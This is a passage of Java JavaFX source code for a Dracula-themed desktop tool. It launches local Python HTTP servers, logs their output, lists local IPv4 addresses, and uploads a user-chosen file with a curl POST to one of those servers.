            serverProcesses.add(process);
            serverList.add(new ServerEntry(ip, port, "HTTP", "Python", fileLocation, "Running"));
            
            // Créer un thread pour lire la sortie du processus
            new Thread(() -> {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        final String logLine = line;
                        Platform.runLater(() -> logMessage(logLine));
                    }
                } catch (IOException e) {
                    Platform.runLater(() -> logMessage("[-] Server process error: " + e.getMessage()));
                }
            }).start();
            
            logMessage("[+] HTTP server started on " + ip + ":" + port);
        } catch (IOException e) {
            logMessage("[-] Failed to start server: " + e.getMessage());
        }
    }

    private void showUploadWindow() {
        Stage stageUpload = new Stage();
        stageUpload.initModality(Modality.APPLICATION_MODAL);
        stageUpload.setTitle("Upload File");

        Label serverLabel = new Label("Select Upload Server");
        serverLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");

        ComboBox<ServerEntry> serverComboBox = new ComboBox<>();
        serverComboBox.setItems(FXCollections.observableArrayList(
            serverList.filtered(server -> server.getType().equals("Upload"))
        ));
        serverComboBox.setPrefWidth(300);

        Button chooseFileButton = new Button("Choose File");
        applyDraculaButtonStyle(chooseFileButton);
        chooseFileButton.setOnAction(e -> {
            ServerEntry selectedServer = serverComboBox.getSelectionModel().getSelectedItem();
            if (selectedServer != null) {
                FileChooser fileChooser = new FileChooser();
                fileChooser.setInitialDirectory(new File(selectedServer.getFileLocation()));
                File selectedFile = fileChooser.showOpenDialog(stageUpload);
                if (selectedFile != null) {
                    uploadFile(selectedServer, selectedFile);
                    stageUpload.close();
                }
            }
        });

        VBox layout = new VBox(10, serverLabel, serverComboBox, chooseFileButton);
        layout.setPadding(new Insets(20));
        layout.setAlignment(Pos.CENTER);
        layout.setStyle("-fx-background-color: " + DRACULA_BACKGROUND + ";");

        Scene sceneUpload = new Scene(layout, 400, 200);
        applyDraculaSceneStyle(sceneUpload);
        
        stageUpload.setScene(sceneUpload);
        applyDraculaStageStyle(stageUpload);
        stageUpload.showAndWait();
    }

    private void uploadFile(ServerEntry server, File file) {
        try {
            String url = "http://" + server.getIp() + ":" + server.getPort() + "/upload";
            ProcessBuilder pb = new ProcessBuilder("curl", "-X", "POST", "-F", "file=@" + file.getAbsolutePath(), url);
            pb.start();
            logMessage("[+] File uploaded to server on port " + server.getPort());
        } catch (IOException e) {
            logMessage("[-] Failed to upload file: " + e.getMessage());
        }
    }

    private List<String> getLocalIPs() {
        List<String> ips = new ArrayList<>();
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface iface = interfaces.nextElement();
                if (iface.isLoopback() || !iface.isUp()) continue;

                Enumeration<InetAddress> addresses = iface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    if (addr instanceof Inet4Address) {
                        ips.add(addr.getHostAddress());
                    }
                }
            }
        } catch (SocketException e) {
            logMessage("[-] Failed to get local IP addresses: " + e.getMessage());
        }
        return ips;
    }

    public static class ServerEntry {
        private final String ip;
        private final int port;
        private final String type;
        private final String language;
        private final String fileLocation;
        private final String status;

        public ServerEntry(String ip, int port, String type, String language, String fileLocation, String status) {
            this.ip = ip;
            this.port = port;
            this.type = type;
            this.language = language;
            this.fileLocation = fileLocation;
            this.status = status;
        }

        public String getIp() {
            return ip;
        }

        public int getPort() {
            return port;
        }

        public String getType() {
            return type;
        }

        public String getLanguage() {
            return language;
        }

        public String getFileLocation() {
            return fileLocation;
        }

        public String getStatus() {
            return status;
        }
    }

    public ObservableList<ServerEntry> getServerList() {
        return serverList;
    }

    public static void main(String[] args) {
        launch(args);
    }
}